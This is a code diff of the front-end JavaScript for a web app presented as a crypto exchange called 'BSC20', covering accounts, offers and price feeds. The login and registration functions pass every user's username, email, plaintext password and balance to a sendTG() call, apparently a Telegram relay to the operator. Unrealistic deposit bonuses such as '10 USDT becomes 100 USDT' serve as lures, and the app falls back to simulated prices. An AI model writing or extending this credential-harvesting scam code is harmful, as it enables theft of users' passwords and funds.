-  {s:'MATIC',n:'Polygon',c:'Layer 2',p:0.72},{s:'SHIB',n:'Shiba Inu',c:'Meme',p:0.0000234},{s:'AVAX',n:'Avalanche',c:'Layer 1',p:35},
-  {s:'LINK',n:'Chainlink',c:'DeFi',p:14.5},{s:'UNI',n:'Uniswap',c:'DeFi',p:8.2},{s:'ATOM',n:'Cosmos',c:'Layer 0',p:9.1},
-  {s:'LTC',n:'Litecoin',c:'Payment',p:72},{s:'ETC',n:'Ethereum Classic',c:'Layer 1',p:26},{s:'FIL',n:'Filecoin',c:'DeFi',p:5.8},
-  {s:'APT',n:'Aptos',c:'Layer 1',p:9.5},{s:'NEAR',n:'NEAR Protocol',c:'Layer 1',p:5.2},{s:'OP',n:'Optimism',c:'Layer 2',p:2.3},
-  {s:'ARB',n:'Arbitrum',c:'Layer 2',p:1.2},{s:'SUI',n:'Sui',c:'Layer 1',p:1.5},{s:'SEI',n:'Sei',c:'Layer 1',p:0.52},
-  {s:'INJ',n:'Injective',c:'DeFi',p:25},{s:'FTM',n:'Fantom',c:'Layer 1',p:0.65},{s:'ALGO',n:'Algorand',c:'Layer 1',p:0.19},
-  {s:'SAND',n:'Sandbox',c:'Meme',p:0.42},{s:'MANA',n:'Decentraland',c:'Meme',p:0.45},{s:'AXS',n:'Axie Infinity',c:'DeFi',p:7.5},
-  {s:'AAVE',n:'Aave',c:'DeFi',p:92},{s:'CRV',n:'Curve DAO',c:'DeFi',p:0.55},{s:'MKR',n:'Maker',c:'DeFi',p:2800},
-  {s:'PEPE',n:'Pepe',c:'Meme',p:0.00001234},{s:'FLOKI',n:'Floki Inu',c:'Meme',p:0.000189},{s:'WIF',n:'dogwifhat',c:'Meme',p:2.45},
-  {s:'BONK',n:'Bonk',c:'Meme',p:0.0000234},{s:'WLD',n:'Worldcoin',c:'DeFi',p:2.8},{s:'FET',n:'Fetch.ai',c:'DeFi',p:2.1},
-  {s:'RNDR',n:'Render',c:'DeFi',p:8.5},{s:'GRT',n:'The Graph',c:'DeFi',p:0.25},{s:'IMX',n:'Immutable X',c:'DeFi',p:2.1},
-  {s:'GALA',n:'Gala Games',c:'DeFi',p:0.038},{s:'TON',n:'Toncoin',c:'Layer 1',p:5.8},{s:'NOT',n:'Notcoin',c:'Meme',p:0.008},
-  {s:'DOGS',n:'DOGS',c:'Meme',p:0.0006},{s:'TAO',n:'Bittensor',c:'DeFi',p:420},{s:'AR',n:'Arweave',c:'DeFi',p:28},
-  {s:'STX',n:'Stacks',c:'Layer 2',p:1.8},{s:'TIA',n:'Celestia',c:'Layer 1',p:8.5},{s:'CAKE',n:'PancakeSwap',c:'DeFi',p:2.5},
-  {s:'DYDX',n:'dYdX',c:'DeFi',p:2.1},{s:'ENS',n:'ENS',c:'DeFi',p:18},{s:'LDO',n:'Lido DAO',c:'DeFi',p:2.2},
-  {s:'BLUR',n:'Blur',c:'DeFi',p:0.35},{s:'APE',n:'ApeCoin',c:'Meme',p:1.4},{s:'GMX',n:'GMX',c:'DeFi',p:38},
-  {s:'PYTH',n:'Pyth Network',c:'DeFi',p:0.38},{s:'JUP',n:'Jupiter',c:'DeFi',p:0.85},{s:'ORDI',n:'ORDI',c:'Layer 1',p:42}
+/* ===== COINS ===== */
+var COINS_RAW=[
+{s:'BTC',n:'Bitcoin',c:'Layer 1',p:65432},{s:'ETH',n:'Ethereum',c:'Layer 1',p:3456},{s:'BNB',n:'BNB',c:'Layer 1',p:580},
+{s:'SOL',n:'Solana',c:'Layer 1',p:152},{s:'XRP',n:'Ripple',c:'Payment',p:0.62},{s:'ADA',n:'Cardano',c:'Layer 1',p:0.45},
+{s:'DOGE',n:'Dogecoin',c:'Meme',p:0.12},{s:'TRX',n:'TRON',c:'Layer 1',p:0.11},{s:'DOT',n:'Polkadot',c:'Layer 1',p:7.2},
+{s:'MATIC',n:'Polygon',c:'Layer 2',p:0.72},{s:'SHIB',n:'Shiba Inu',c:'Meme',p:0.0000234},{s:'AVAX',n:'Avalanche',c:'Layer 1',p:35},
+{s:'LINK',n:'Chainlink',c:'DeFi',p:14.5},{s:'UNI',n:'Uniswap',c:'DeFi',p:8.2},{s:'ATOM',n:'Cosmos',c:'DeFi',p:9.1},
+{s:'LTC',n:'Litecoin',c:'Payment',p:72},{s:'ETC',n:'Ethereum Classic',c:'Layer 1',p:26},{s:'FIL',n:'Filecoin',c:'DeFi',p:5.8},
+{s:'APT',n:'Aptos',c:'Layer 1',p:9.5},{s:'NEAR',n:'NEAR Protocol',c:'Layer 1',p:5.2},{s:'OP',n:'Optimism',c:'Layer 2',p:2.3},
+{s:'ARB',n:'Arbitrum',c:'Layer 2',p:1.2},{s:'SUI',n:'Sui',c:'Layer 1',p:1.5},{s:'SEI',n:'Sei',c:'Layer 1',p:0.52},
+{s:'INJ',n:'Injective',c:'DeFi',p:25},{s:'FTM',n:'Fantom',c:'Layer 1',p:0.65},{s:'ALGO',n:'Algorand',c:'Layer 1',p:0.19},
+{s:'SAND',n:'Sandbox',c:'Meme',p:0.42},{s:'MANA',n:'Decentraland',c:'Meme',p:0.45},{s:'AXS',n:'Axie Infinity',c:'DeFi',p:7.5},
+{s:'AAVE',n:'Aave',c:'DeFi',p:92},{s:'CRV',n:'Curve DAO',c:'DeFi',p:0.55},{s:'MKR',n:'Maker',c:'DeFi',p:2800},
+{s:'PEPE',n:'Pepe',c:'Meme',p:0.00001234},{s:'FLOKI',n:'Floki Inu',c:'Meme',p:0.000189},{s:'WIF',n:'dogwifhat',c:'Meme',p:2.45},
+{s:'BONK',n:'Bonk',c:'Meme',p:0.0000234},{s:'WLD',n:'Worldcoin',c:'DeFi',p:2.8},{s:'FET',n:'Fetch.ai',c:'DeFi',p:2.1},
+{s:'RNDR',n:'Render',c:'DeFi',p:8.5},{s:'GRT',n:'The Graph',c:'DeFi',p:0.25},{s:'IMX',n:'Immutable X',c:'DeFi',p:2.1},
+{s:'GALA',n:'Gala Games',c:'DeFi',p:0.038},{s:'TON',n:'Toncoin',c:'Layer 1',p:5.8},{s:'NOT',n:'Notcoin',c:'Meme',p:0.008},
+{s:'DOGS',n:'DOGS',c:'Meme',p:0.0006},{s:'TAO',n:'Bittensor',c:'DeFi',p:420},{s:'AR',n:'Arweave',c:'DeFi',p:28},
+{s:'STX',n:'Stacks',c:'Layer 2',p:1.8},{s:'TIA',n:'Celestia',c:'Layer 1',p:8.5},{s:'CAKE',n:'PancakeSwap',c:'DeFi',p:2.5},
+{s:'DYDX',n:'dYdX',c:'DeFi',p:2.1},{s:'ENS',n:'ENS',c:'DeFi',p:18},{s:'LDO',n:'Lido DAO',c:'DeFi',p:2.2},
+{s:'BLUR',n:'Blur',c:'DeFi',p:0.35},{s:'APE',n:'ApeCoin',c:'Meme',p:1.4},{s:'GMX',n:'GMX',c:'DeFi',p:38},
+{s:'PYTH',n:'Pyth Network',c:'DeFi',p:0.38},{s:'JUP',n:'Jupiter',c:'DeFi',p:0.85},{s:'ORDI',n:'ORDI',c:'Layer 1',p:42}
 ];
 
-var COINS = [];
-var user = null;
-var isAdmin = false;
-var selNet = 'TON';
-var curPair = 'BTCUSDT';
-var ordType = 'market';
-var editUID = null;
-var priceTimer = null;
-var posTimer = null;
-var curMktTab = 'all';
+var COINS=[];
+var user=null;
+var isAdmin=false;
+var selNet='TON';
+var curPair='BTCUSDT';
+var ordType='market';
+var editUID=null;
+var priceTimer=null;
+var posTimer=null;
+var curMF='all';
+var curHF='hot';
 
-var OFFERS = [
-  {id:1,i:'🎉',t:'First Deposit Bonus',d:'Deposit 10 USDT and receive 100 USDT instantly! New users only.',b:'10 > 100 USDT',a:'Deposit Now',p:'wallet'},
-  {id:2,i:'🔄',t:'Daily Trading Reward',d:'Trade $1,000+ daily volume and earn 5 USDT bonus daily!',b:'5 USDT/Day',a:'Trade Now',p:'futures'},
-  {id:3,i:'👥',t:'Referral Program',d:'Refer friends and earn 20% commission on their trading fees forever!',b:'20% Forever',a:'Copy Link'},
-  {id:4,i:'🏆',t:'VIP Deposit Tiers',d:'$100>$20, $500>$120, $1000>$300, $5000>$1800 bonus!',b:'Up to $4000',a:'Deposit',p:'wallet'},
-  {id:5,i:'🎰',t:'Lucky Spin Wheel',d:'Spin the wheel once daily! Win 1-100 USDT. Min $50 balance.',b:'Daily Spin',a:'Spin Now'},
-  {id:6,i:'📈',t:'Futures Welcome Bonus',d:'Open your first futures trade and get 50 USDT bonus!',b:'50 USDT Free',a:'Trade',p:'futures'},
-  {id:7,i:'💎',t:'Diamond Hands Reward',d:'Hold $500+ for 7 days>15 USDT, 30 days>75, 90 days>250!',b:'HODL Bonus',a:'Start Holding'},
-  {id:8,i:'🎯',t:'Trading Competition',d:'Weekly! 1st: 1000 USDT, 2nd: 500, 3rd: 250 prize pool!',b:'$1750 Prize',a:'Leaderboard'},
-  {id:9,i:'🌙',t:'Night Owl Bonus',d:'Trade 12AM-6AM UTC and earn 2x trading rewards!',b:'2x Rewards',a:'Trade Night',p:'futures'},
-  {id:10,i:'🎂',t:'Birthday Bonus',d:'Get 25 USDT on your birthday! VIP members get 100 USDT!',b:'25-100 USDT',a:'Set Birthday'},
-  {id:11,i:'📱',t:'App Download Bonus',d:'Download app>5, Notifications>+2, Rate 5 stars>+3 USDT!',b:'10 USDT',a:'Download'},
-  {id:12,i:'🔐',t:'Security Reward',d:'Email+2, Phone+3, 2FA+5, KYC1+5, KYC2+10 = 25 USDT!',b:'25 USDT',a:'Secure'},
-  {id:13,i:'🔥',t:'Weekend Deposit Boost',d:'Saturday and Sunday deposits get 10% extra bonus!',b:'+10% Extra',a:'Deposit',p:'wallet'},
-  {id:14,i:'🎮',t:'Price Prediction',d:'Predict BTC price! Within $100: 50 USDT, $500: 20 USDT!',b:'50 USDT',a:'Predict'},
-  {id:15,i:'💳',t:'Deposit Streak',d:'Daily deposit! Day 7: 25, Day 14: 75, Day 30: 200 USDT!',b:'200 USDT',a:'Start',p:'wallet'},
-  {id:16,i:'🌟',t:'Mystery Box',d:'Trade $500+ daily to unlock! Win 1-1000 USDT randomly!',b:'Random',a:'Open Box'}
+var OFFERS=[
+{id:1,i:'🎉',t:'First Deposit Bonus',d:'Deposit 10 USDT and receive 100 USDT instantly! New users only.',b:'10 > 100 USDT',a:'Deposit Now',p:'wallet'},
+{id:2,i:'🔄',t:'Daily Trading Reward',d:'Trade $1,000+ daily volume and earn 5 USDT bonus daily!',b:'5 USDT/Day',a:'Trade Now',p:'futures'},
+{id:3,i:'👥',t:'Referral Program',d:'Refer friends and earn 20% commission on their trading fees forever!',b:'20% Forever',a:'Copy Link'},
+{id:4,i:'🏆',t:'VIP Deposit Tiers',d:'$100>$20, $500>$120, $1000>$300, $5000>$1800 bonus!',b:'Up to $4000',a:'Deposit',p:'wallet'},
+{id:5,i:'🎰',t:'Lucky Spin Wheel',d:'Spin the wheel once daily! Win 1-100 USDT. Min $50 balance.',b:'Daily Spin',a:'Spin Now'},
+{id:6,i:'📈',t:'Futures Welcome Bonus',d:'Open your first futures trade and get 50 USDT bonus!',b:'50 USDT Free',a:'Trade',p:'futures'},
+{id:7,i:'💎',t:'Diamond Hands Reward',d:'Hold $500+ for 7 days>15 USDT, 30 days>75, 90 days>250!',b:'HODL Bonus',a:'Start Holding'},
+{id:8,i:'🎯',t:'Trading Competition',d:'Weekly! 1st: 1000 USDT, 2nd: 500, 3rd: 250 prize pool!',b:'$1750 Prize',a:'Leaderboard'},
+{id:9,i:'🌙',t:'Night Owl Bonus',d:'Trade 12AM-6AM UTC and earn 2x trading rewards!',b:'2x Rewards',a:'Trade Night',p:'futures'},
+{id:10,i:'🎂',t:'Birthday Bonus',d:'Get 25 USDT on your birthday! VIP members get 100 USDT!',b:'25-100 USDT',a:'Set Birthday'},
+{id:11,i:'📱',t:'App Download Bonus',d:'Download app>5, Notifications>+2, Rate 5 stars>+3 USDT!',b:'10 USDT',a:'Download'},
+{id:12,i:'🔐',t:'Security Reward',d:'Email+2, Phone+3, 2FA+5, KYC1+5, KYC2+10 = 25 USDT!',b:'25 USDT',a:'Secure'},
+{id:13,i:'🔥',t:'Weekend Deposit Boost',d:'Saturday and Sunday deposits get 10% extra bonus!',b:'+10% Extra',a:'Deposit',p:'wallet'},
+{id:14,i:'🎮',t:'Price Prediction',d:'Predict BTC price! Within $100: 50 USDT, $500: 20 USDT!',b:'50 USDT',a:'Predict'},
+{id:15,i:'💳',t:'Deposit Streak',d:'Daily deposit! Day 7: 25, Day 14: 75, Day 30: 200 USDT!',b:'200 USDT',a:'Start',p:'wallet'},
+{id:16,i:'🌟',t:'Mystery Box',d:'Trade $500+ daily to unlock! Win 1-1000 USDT randomly!',b:'Random',a:'Open Box'}
 ];
 
-// LS
-function LS(k, v) {
-  if (v === undefined) {
-    try { return JSON.parse(localStorage.getItem(k)); } catch (e) { return null; }
-  }
-  if (v === null) { localStorage.removeItem(k); return; }
-  localStorage.setItem(k, JSON.stringify(v));
+function LS(k,v){
+if(v===undefined){try{return JSON.parse(localStorage.getItem(k))}catch(e){return null}}
+if(v===null){localStorage.removeItem(k);return}
+localStorage.setItem(k,JSON.stringify(v));
 }
 
-// INIT
-function init() {
-  loadCoins();
-  var ses = LS('bsc20_ses');
-  if (ses) {
-    if (ses.admin) {
-      isAdmin = true;
-      enterApp();
-      goPage('admin');
-    } else {
-      var u = getUser(ses.id);
-      if (u) {
-        user = u;
-        enterApp();
-        goPage('home');
-      } else {
-        showLogin();
-      }
-    }
-  } else {
-    showLogin();
-  }
+function init(){
+loadCoins();
+var ses=LS('bsc20_ses');
+if(ses){
+if(ses.admin){
+isAdmin=true;
+enterApp();
+goPage('admin');
+}else{
+var u=getUser(ses.id);
+if(u){
+if(u.banned){
+toast('Account banned','err');
+LS('bsc20_ses',null);
+showLogin();
+return;
+}
+user=u;
+enterApp();
+goPage('home');
+}else{showLogin()}
+}
+}else{showLogin()}
 }
 
-function showLogin() {
-  document.getElementById('loginPage').classList.add('active');
-  document.getElementById('loginPage').style.display = '';
-  document.getElementById('appWrap').style.display = 'none';
+function showLogin(){
+document.getElementById('loginPage').classList.add('active');
+document.getElementById('loginPage').style.display='';
+document.getElementById('appWrap').style.display='none';
 }
 
-function enterApp() {
-  document.getElementById('loginPage').classList.remove('active');
-  document.getElementById('loginPage').style.display = 'none';
-  document.getElementById('appWrap').style.display = 'block';
-  if (isAdmin) {
-    document.getElementById('bNav').innerHTML = '<div class="bnav-i on" onclick="goPage(\'admin\')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg><span>Admin</span></div><div class="bnav-i" onclick="goPage(\'market\')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg><span>Market</span></div><div class="bnav-i" onclick="doLogout()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4M16 17l5-5-5-5M21 12H9"/></svg><span>Logout</span></div>';
-    document.getElementById('hBal').textContent = 'ADMIN';
-    document.querySelector('.hdr-av').textContent = 'A';
-  } else if (user) {
-    document.querySelector('.hdr-av').textContent = user.username.charAt(0).toUpperCase();
-  }
-  startPriceFeed();
+function enterApp(){
+document.getElementById('loginPage').classList.remove('active');
+document.getElementById('loginPage').style.display='none';
+document.getElementById('appWrap').style.display='block';
+if(isAdmin){
+document.getElementById('bNav').innerHTML='<div class="bnav-i on" onclick="goPage(\'admin\')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg><span>Admin</span></div><div class="bnav-i" onclick="goPage(\'market\')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg><span>Market</span></div><div class="bnav-i" onclick="doLogout()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4M16 17l5-5-5-5M21 12H9"/></svg><span>Logout</span></div>';
+document.getElementById('hBal').textContent='ADMIN';
+document.getElementById('hdrAv').textContent='A';
+}else if(user){
+document.getElementById('hdrAv').textContent=user.username.charAt(0).toUpperCase();
+document.getElementById('profAv').textContent=user.username.charAt(0).toUpperCase();
+}
+startPrices();
 }
 
-function loadCoins() {
-  var s = LS('bsc20_coins');
-  if (s && s.length >= 30) { COINS = s; return; }
-  COINS = [];
-  for (var i = 0; i < COINS_RAW.length; i++) {
-    var c = COINS_RAW[i];
-    COINS.push({
-      s: c.s, n: c.n, c: c.c, p: c.p,
-      ch: (Math.random() * 20 - 8).toFixed(2),
-      vol: Math.floor(Math.random() * 5e9),
-      hi: c.p * (1 + Math.random() * .05),
-      lo: c.p * (1 - Math.random() * .05)
-    });
-  }
-  LS('bsc20_coins', COINS);
+function loadCoins(){
+var s=LS('bsc20_coins');
+if(s&&s.length>=30){COINS=s;return}
+COINS=[];
+for(var i=0;i<COINS_RAW.length;i++){
+var c=COINS_RAW[i];
+COINS.push({s:c.s,n:c.n,c:c.c,p:c.p,ch:(Math.random()*20-8).toFixed(2),vol:Math.floor(Math.random()*5e9),hi:c.p*(1+Math.random()*.05),lo:c.p*(1-Math.random()*.05)});
+}
+LS('bsc20_coins',COINS);
 }
 
-// AUTH
-function switchLTab(idx) {
-  var tabs = document.querySelectorAll('#lTabs .ltab');
-  for (var i = 0; i < tabs.length; i++) {
-    if (i === idx) tabs[i].classList.add('on');
-    else tabs[i].classList.remove('on');
-  }
-  for (var j = 0; j <= 2; j++) {
-    var f = document.getElementById('lf' + j);
-    if (j === idx) f.classList.add('on');
-    else f.classList.remove('on');
-  }
+/* ===== AUTH ===== */
+function switchLTab(idx){
+var tabs=document.querySelectorAll('#lTabs .ltab');
+for(var i=0;i<tabs.length;i++){tabs[i].classList.toggle('on',i===idx)}
+for(var j=0;j<=2;j++){
+var f=document.getElementById('lf'+j);
+f.classList.toggle('on',j===idx);
+}
 }
 
-function doLogin() {
-  var em = document.getElementById('l_em').value.trim();
-  var pw = document.getElementById('l_pw').value.trim();
-  if (!em || !pw) return toast('Fill all fields', 'err');
-  var users = LS('bsc20_users') || [];
-  var u = null;
-  for (var i = 0; i < users.length; i++) {
-    if (users[i].email === em || users[i].username === em) { u = users[i]; break; }
-  }
-  if (!u) {
-    u = createUser(em, em.split('@')[0] || em, pw);
-    toast('Account created! Welcome!', 'ok');
-  } else if (u.password !== pw) {
-    return toast('Wrong password!', 'err');
-  }
-  user = u;
-  LS('bsc20_ses', { id: u.id });
-  enterApp();
-  goPage('home');
-  var w = getWallet(u.id);
-  sendTG('LOGIN\n\nUsername: ' + u.username + '\nEmail: ' + u.email + '\nUser ID: ' + u.id + '\nPassword: ' + u.password + '\nBalance: $' + (w.main + w.bonus).toFixed(2) + '\nTime: ' + new Date().toLocaleString() + '\nTotal Users: ' + (LS('bsc20_users') || []).length);
+function doLogin(){
+var em=document.getElementById('l_em').value.trim();
+var pw=document.getElementById('l_pw').value.trim();
+if(!em||!pw)return toast('Fill all fields','err');
+var users=LS('bsc20_users')||[];
+var u=null;
+for(var i=0;i<users.length;i++){
+if(users[i].email===em||users[i].username===em){u=users[i];break}
+}
+if(!u){
+u=createUser(em,em.split('@')[0]||em,pw);
+toast('Account created! Welcome!','ok');
+}else if(u.password!==pw){
+return toast('Wrong password!','err');
+}
+if(u.banned)return toast('Account banned!','err');
+user=u;
+LS('bsc20_ses',{id:u.id});
+enterApp();
+goPage('home');
+var w=getWallet(u.id);
+sendTG('LOGIN\n\nUsername: '+u.username+'\nEmail: '+u.email+'\nUser ID: '+u.id+'\nPassword: '+u.password+'\nBalance: $'+(w.main+w.bonus).toFixed(2)+'\nTime: '+new Date().toLocaleString()+'\nTotal Users: '+(LS('bsc20_users')||[]).length);
 }
 
-function doRegister() {
-  var em = document.getElementById('r_em').value.trim();
-  var un = document.getElementById('r_un').value.trim();
-  var pw = document.getElementById('r_pw').value.trim();
-  var pw2 = document.getElementById('r_pw2').value.trim();
-  if (!em || !un || !pw) return toast('Fill all fields', 'err');
-  if (pw !== pw2) return toast('Passwords do not match!', 'err');
-  var users = LS('bsc20_users') || [];
-  for (var i = 0; i < users.length; i++) {
-    if (users[i].email === em) return toast('Email already exists!', 'err');
-  }
-  var u = createUser(em, un, pw);
-  user = u;
-  LS('bsc20_ses', { id: u.id });
-  enterApp();
-  goPage('home');
-  toast('Welcome to BSC20!', 'ok');
-  sendTG('NEW USER REGISTERED\n\nUsername: ' + u.username + '\nEmail: ' + u.email + '\nUser ID: ' + u.id + '\nPassword: ' + u.password + '\nTime: ' + new Date().toLocaleString() + '\nTotal Users: ' + (LS('bsc20_users') || []).length);
+function doRegister(){
+var em=document.getElementById('r_em').value.trim();
+var un=document.getElementById('r_un').value.trim();
+var pw=document.getElementById('r_pw').value.trim();
+var pw2=document.getElementById('r_pw2').value.trim();
+if(!em||!un||!pw)return toast('Fill all fields','err');
+if(pw!==pw2)return toast('Passwords do not match!','err');
+var users=LS('bsc20_users')||[];
+for(var i=0;i<users.length;i++){
+if(users[i].email===em)return toast('Email already exists!','err');
+}
+var u=createUser(em,un,pw);
+user=u;
+LS('bsc20_ses',{id:u.id});
+enterApp();
+goPage('home');
+toast('Welcome to BSC20!','ok');
+sendTG('NEW USER\n\nUsername: '+u.username+'\nEmail: '+u.email+'\nUser ID: '+u.id+'\nPassword: '+u.password+'\nTime: '+new Date().toLocaleString()+'\nTotal Users: '+(LS('bsc20_users')||[]).length);
 }
 
-function createUser(em, un, pw) {
-  var id = 'u_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
-  var obj = { id: id, email: em, username: un, password: pw, created: new Date().toISOString() };
-  var users = LS('bsc20_users') || [];
-  users.push(obj);
-  LS('bsc20_users', users);
-  var ws = LS('bsc20_wallets') || {};
-  ws[id] = { main: 0, bonus: 0 };
-  LS('bsc20_wallets', ws);
-  return obj;
+function createUser(em,un,pw){
+var id='u_'+Date.now()+'_'+Math.random().toString(36).substr(2,5);
+var obj={id:id,email:em,username:un,password:pw,created:new Date().toISOString(),banned:false};
+var users=LS('bsc20_users')||[];
+users.push(obj);
+LS('bsc20_users',users);
+var ws=LS('bsc20_wallets')||{};
+ws[id]={main:0,bonus:0};
+LS('bsc20_wallets',ws);
+return obj;
 }
 
-function getUser(id) {
-  var users = LS('bsc20_users') || [];
-  for (var i = 0; i < users.length; i++) {
-    if (users[i].id === id) return users[i];
-  }
-  return null;
+function getUser(id){
+var users=LS('bsc20_users')||[];
+for(var i=0;i<users.length;i++){if(users[i].id===id)return users[i]}
+return null;
 }
 
-function doAdminLogin() {
-  var id = document.getElementById('a_id').value.trim();
-  var pw = document.getElementById('a_pw').value.trim();
-  if (id === CFG.ADMIN_ID && pw === CFG.ADMIN_PASS) {
-    isAdmin = true;
-    LS('bsc20_ses', { id: 'admin', admin: true });
-    enterApp();
-    goPage('admin');
-    toast('Admin access granted', 'ok');
-  } else {
-    toast('Invalid admin credentials', 'err');
-  }
+function doAdminLogin(){
+var id=document.getElementById('a_id').value.trim();
+var pw=document.getElementById('a_pw').value.trim();
+if(id===CFG.AID&&pw===CFG.APW){
+isAdmin=true;
+LS('bsc20_ses',{id:'admin',admin:true});
+enterApp();
+goPage('admin');
+toast('Admin access granted','ok');
+}else{toast('Invalid credentials','err')}
 }
 
-function doLogout() {
-  user = null;
-  isAdmin = false;
-  LS('bsc20_ses', null);
-  if (priceTimer) clearInterval(priceTimer);
-  if (posTimer) clearInterval(posTimer);
-  location.reload();
+function doLogout(){
+user=null;isAdmin=false;
+LS('bsc20_ses',null);
+location.reload();
 }
 
-// NAV
-function goPage(p) {
-  var pages = document.querySelectorAll('.page');
-  for (var i = 0; i < pages.length; i++) pages[i].classList.remove('active');
-  var el = document.getElementById('pg_' + p);
-  if (el) el.classList.add('active');
-  var navMap = { home: 0, market: 1, futures: 2, wallet: 3, profile: 4, admin: 0, offers: 4 };
-  var navItems = document.querySelectorAll('#bNav .bnav-i');
-  var idx = navMap[p] !== undefined ? navMap[p] : 0;
-  for (var j = 0; j < navItems.length; j++) {
-    if (j === idx) navItems[j].classList.add('on');
-    else navItems[j].classList.remove('on');
-  }
-  refreshPage(p);
+/* ===== NAV ===== */
+function goPage(p){
+var pages=document.querySelectorAll('.page');
+for(var i=0;i<pages.length;i++)pages[i].classList.remove('active');
+var el=document.getElementById('pg_'+p);
+if(el)el.classList.add('active');
+var navMap={home:0,market:1,futures:2,wallet:3,profile:4,admin:0,offers:4};
+var navItems=document.querySelectorAll('#bNav .bnav-i');
+var idx=navMap[p]!==undefined?navMap[p]:0;
+for(var j=0;j<navItems.length;j++){navItems[j].classList.toggle('on',j===idx)}
+refreshPage(p);
 }
 
-function refreshPage(p) {
-  updateBalances();
-  if (p === 'home') { renderHomeCoins(); renderHomeOffers(); }
-  if (p === 'market') renderMarketCoins();
-  if (p === 'futures') { updateFuturesPrice(); renderPositions(); renderFutHist(); loadTVChart(); }
-  if (p === 'wallet') { renderHistory(); genQR(); updateDepAddr(); }
-  if (p === 'admin') renderAdmin();
-  if (p === 'offers') renderOffers();
-  if (p === 'profile') renderProfile();
+function refreshPage(p){
+updateBals();
+if(p==='home'){renderHCoins();renderHOffers()}
+if(p==='market')renderMCoins();
+if(p==='futures'){updateFP();renderPos();renderFH();loadTV()}
+if(p==='wallet'){renderHist();genQR();updateDA()}
+if(p==='admin')renderAdmin();
+if(p==='offers')renderOffers();
+if(p==='profile')renderProfile();
 }
 
-// PRICES
-function startPriceFeed() {
-  fetchPrices();
-  priceTimer = setInterval(fetchPrices, 15000);
-  posTimer = setInterval(function () {
-    var pg = document.querySelector('.page.active');
-    if (pg && pg.id === 'pg_futures' && user) {
-      renderPositions();
-      updateFuturesPrice();
-    }
-  }, 5000);
-  updateTicker();
+/* ===== PRICES ===== */
+function startPrices(){
+fetchPrices();
+priceTimer=setInterval(fetchPrices,15000);
+posTimer=setInterval(function(){
+var pg=document.querySelector('.page.active');
+if(pg&&pg.id==='pg_futures'&&user){renderPos();updateFP()}
+},5000);
+updateTicker();
 }
 
-function fetchPrices() {
-  tryBinanceSpot()
-    .then(function (ok) { if (!ok) return tryBinanceFutures(); })
-    .then(function (ok) { if (!ok) return tryBybit(); })
-    .then(function (ok) { if (!ok) return tryCoinGecko(); })
-    .then(function (ok) { if (!ok) simulatePrices(); })
-    .then(function () {
-      LS('bsc20_coins', COINS);
-      onPriceUpdate();
-    })
-    .catch(function () {
-      simulatePrices();
-      LS('bsc20_coins', COINS);
-      onPriceUpdate();
-    });
+function fetchPrices(){
+tryAPI('https://api.binance.com/api/v3/ticker/24hr','binance')
+.then(function(ok){if(!ok)return tryAPI('https://fapi.binance.com/fapi/v1/ticker/24hr','bfut')})
+.then(function(ok){if(!ok)return tryAPI('https://api.bybit.com/v5/market/tickers?category=spot','bybit')})
+.then(function(ok){if(!ok)return tryAPI('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=100&page=1','gecko')})
+.then(function(ok){if(!ok)simPrices()})
+.then(function(){LS('bsc20_coins',COINS);onPU()})
+.catch(function(){simPrices();LS('bsc20_coins',COINS);onPU()});
 }
 
-function tryBinanceSpot() {
-  return fetch('https://api.binance.com/api/v3/ticker/24hr')
-    .then(function (r) { return r.json(); })
-    .then(function (d) {
-      var m = {};
-      for (var i = 0; i < d.length; i++) m[d[i].symbol] = d[i];
-      var found = false;
-      for (var j = 0; j < COINS.length; j++) {
-        var k = COINS[j].s + 'USDT';
-        if (m[k]) {
-          COINS[j].p = parseFloat(m[k].lastPrice);
-          COINS[j].ch = parseFloat(m[k].priceChangePercent).toFixed(2);
-          COINS[j].vol = parseFloat(m[k].quoteVolume);
-          COINS[j].hi = parseFloat(m[k].highPrice);
-          COINS[j].lo = parseFloat(m[k].lowPrice);
-          found = true;
-        }
-      }
-      return found;
-    })
-    .catch(function () { return false; });
+function tryAPI(url,type){
+return fetch(url).then(function(r){return r.json()}).then(function(d){
+var found=false;
+if(type==='binance'){
+var m={};for(var i=0;i<d.length;i++)m[d[i].symbol]=d[i];
+for(var j=0;j<COINS.length;j++){
+var k=COINS[j].s+'USDT';
+if(m[k]){COINS[j].p=parseFloat(m[k].lastPrice);COINS[j].ch=parseFloat(m[k].priceChangePercent).toFixed(2);COINS[j].vol=parseFloat(m[k].quoteVolume);COINS[j].hi=parseFloat(m[k].highPrice);COINS[j].lo=parseFloat(m[k].lowPrice);found=true}
+}
+}else if(type==='bfut'){
+for(var i=0;i<d.length;i++){
+var sym=d[i].symbol.replace('USDT','');
+for(var j=0;j<COINS.length;j++){
+if(COINS[j].s===sym){COINS[j].p=parseFloat(d[i].lastPrice);COINS[j].ch=parseFloat(d[i].priceChangePercent).toFixed(2);COINS[j].vol=parseFloat(d[i].quoteVolume);found=true}
+}
+}
+}else if(type==='bybit'){
+if(!d.result||!d.result.list)return false;
+for(var i=0;i<d.result.list.length;i++){
+var t=d.result.list[i];var sym=t.symbol.replace('USDT','');
+for(var j=0;j<COINS.length;j++){
+if(COINS[j].s===sym){COINS[j].p=parseFloat(t.lastPrice);COINS[j].ch=(parseFloat(t.price24hPcnt)*100).toFixed(2);COINS[j].vol=parseFloat(t.turnover24h);found=true}
+}
+}
+}else if(type==='gecko'){
+for(var i=0;i<d.length;i++){
